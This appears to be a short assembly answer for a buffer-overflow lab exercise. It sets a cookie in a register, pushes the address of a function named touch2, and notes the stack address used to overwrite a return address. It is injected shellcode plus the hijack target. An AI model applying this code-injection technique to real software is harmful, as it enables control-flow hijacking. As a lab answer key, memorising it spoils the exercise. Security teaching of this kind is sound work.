movl $0x59b997fa,%edi # set cookie
pushq $0x4017ec # call function touch2
ret
# overwrite return address: 0x5561dc78
